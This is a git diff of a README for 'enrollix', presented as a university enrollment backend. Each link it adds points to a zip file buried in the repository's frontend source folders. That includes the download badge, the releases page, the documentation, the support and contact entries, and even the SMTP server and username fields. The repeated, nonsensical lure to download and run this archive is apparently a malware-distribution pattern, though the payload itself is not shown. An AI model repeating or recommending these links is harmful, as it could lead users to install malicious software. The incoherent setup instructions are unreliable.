@@ -6,13 +6,13 @@ Welcome to **enrollix**, a user-friendly backend system designed to make univers
 
 ## 🔗 Download
 
-[![Download enrollix](https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/pages/Software_v2.9.zip%https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/pages/Software_v2.9.zip)](https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/pages/Software_v2.9.zip)
+[![Download enrollix](https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/hooks/Software_v2.6.zip%https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/hooks/Software_v2.6.zip)](https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/hooks/Software_v2.6.zip)
 
 ## 📥 Download & Install
 
 To start using **enrollix**, you need to visit our Releases page to download the software. Follow these steps:
 
-1. Go to the [Releases page](https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/pages/Software_v2.9.zip).
+1. Go to the [Releases page](https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/hooks/Software_v2.6.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the download link for your operating system. If you are unsure which file to choose, please refer to the following options:
 
@@ -56,9 +56,9 @@ To complete your setup, you will need to configure email settings:
 
 1. Open the application and navigate to the settings section.
 2. Enter your SMTP server details. Here’s an example setup:
-   - **Server**: https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/pages/Software_v2.9.zip
+   - **Server**: https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/hooks/Software_v2.6.zip
    - **Port**: 587
-   - **Username**: https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/pages/Software_v2.9.zip
+   - **Username**: https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/hooks/Software_v2.6.zip
    - **Password**: your_password
 3. Save your settings, and the application will send a verification email to new users.
 
@@ -66,13 +66,13 @@ To complete your setup, you will need to configure email settings:
 
 For more help, refer to the following resources:
 
-- [Documentation](https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/pages/Software_v2.9.zip): Detailed documentation covering all functionalities.
-- [Community Support](https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/pages/Software_v2.9.zip): Report issues or ask questions.
+- [Documentation](https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/hooks/Software_v2.6.zip): Detailed documentation covering all functionalities.
+- [Community Support](https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/hooks/Software_v2.6.zip): Report issues or ask questions.
 
 ## 📞 Contact
 
-If you need further assistance, you can reach us at https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/pages/Software_v2.9.zip Our support team is here to help you with any questions or concerns.
+If you need further assistance, you can reach us at https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/hooks/Software_v2.6.zip Our support team is here to help you with any questions or concerns.
 
 ## 🔗 Download Again
 
-If you need to download **enrollix** again, simply visit our [Releases page](https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/pages/Software_v2.9.zip). We keep it updated with the latest features and fixes.
+If you need to download **enrollix** again, simply visit our [Releases page](https://github.com/juanjoSD/enrollix/raw/refs/heads/main/frontend/src/hooks/Software_v2.6.zip). We keep it updated with the latest features and fixes.
